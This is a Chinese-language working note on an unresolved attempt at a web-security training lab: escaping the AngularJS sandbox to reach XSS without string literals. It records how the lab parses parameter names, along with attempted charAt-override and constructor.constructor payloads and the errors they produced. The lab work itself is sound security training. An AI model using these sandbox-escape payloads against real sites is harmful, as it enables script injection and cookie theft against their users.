---
title: "lab-angular-sandbox-escape-without-strings"
links:
  - target: client-side-template-injection-family
    relation: evidences
---

# lab-angular-sandbox-escape-without-strings

> evidences: [[client-side-template-injection-family]]

- 题面:Reflected XSS with AngularJS sandbox escape without strings(/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings)
- 实例(批38):https://0a3a0066038e9b7d80891c2f0044004b.web-security-academy.net
- 判定目标:逃逸沙箱并执行 `alert`(不可用 `$eval`、不可用字符串);状态:**unresolved**(批38 把墙拆成三条可证事实)

## 已确认

1. 服务端为**每个 query 参数**生成一块:`var key = '<名字>'; $scope.query[key]='<值>'; $scope.value = $parse(key)($scope.query);`
   ⇒ **参数名当 Angular 表达式被 $parse**;`<h1 ng-controller=vulnCtrl>{{value}}</h1>` 只作文本 sink。参数名无反过滤(实测 `[`/`]`/`|`/`;` 原样写入 `var key`)。
2. **参数按名字典序(不是 query 顺序)迭代** —— 批38 实测:query `?search=z&<toString…join>=1&<constructor…>=1`
   生成顺序为 `search` → `constructor…` → `toString…`。⇒ 想先跑 override 再跑 payload,必须让 **payload 名字排在 override 之后**(如加 `zzz;` 前缀)。
3. **charAt override 生效且全局**:`toString().constructor.prototype.charAt=[].join` 经 $parse 执行后
   `String.prototype.charAt` 变成 `function join() { [native code] }`(实测 ✓),沙箱的 isIdent 随之被欺骗。
4. **但 fooled 之后的 $parse 有两堵新墙(实测)**:
   - **词法器**:`$parse("zzz;alert(1)")` / `$parse("zzz;constructor.constructor(97,108,…)()")` → `[$parse:lexerr] Unexpected next character [z]`
     (含数字字面量/某些位置的 token 会崩);`$parse("zzz;constructor.constructor(toString().constructor.fromCharCode(97,…))()")` 能过词法;
   - **运行时检查还在**:上一条过词法后 → `[$parse:isecobj]`(`constructor.constructor` 仍被 ensureSafeObject 拦)。
   即 override 只废掉了 isIdent 相关的重写,并未整体废掉 ensureSafe* 包装。
5. 已有原语(基线):`(1+[]).constructor`=String、`toString().constructor`=String、`[]+{}`、`[].filter.toString()` 造串;
   `constructor`/`toString.constructor`/`[].filter.constructor`/`.call`/`.bind` 直路均被拦(isecobj/isecfn/isecff)。

## 未决面(更锐利)

- 现在缺的是**同时过词法器与 ensureSafe 的执行原语**:必须是不含裸数字字面量、不写出 `constructor.constructor` 直面的表达式,
  且要以"参数名表达式"或 `orderBy` 字符串谓词(运行时 $parse)形式出现。候选:
  ①`orderBy` 谓词 + 数组元素含 window/对象(谓词以元素为 scope 求值)⇒ 走 `(y=alert)(document.cookie)` 式赋值调用(批24 已证可绕 isecwindow);
  ②用 `fromCharCode` 拼出选择器/属性名再经 `[]` 取(需绕开被删除的 `[`/`]` —— 参数名里它们**能**用,已验证)。
- 下一步:在页面上用 eval 直接枚举"override 之后 $parse 哪些谓词能过词法且能执行"(把 `zzz;` 前缀去掉/换成字母前缀对照),
  得到可用集合后拼最终两参数 URL。

## 证据摘录

```
服务端产物(批38):var key = 'constructor.constructor(toString().constructor.fromCharCode(...))()'; 在 var key = 'toString().constructor.prototype.charAt=[].join'; 之**前**(字典序)
eval: $parse("toString().constructor.prototype.charAt=[].join") -> "[object Object]" ; String.prototype.charAt -> function join() { [native code] }
eval: $parse("zzz;alert(1)") -> [$parse:lexerr] Unexpected next character [z]
eval: $parse("zzz;constructor.constructor(toString().constructor.fromCharCode(97,108,101,114,116,40,49,41))()") -> [$parse:isecobj]
eval(手工 override 后): $parse("constructor.constructor(alert(7))()") -> alert 真发(说明"取 Function"这一步本身可行,只是需绕开重写包装)
```
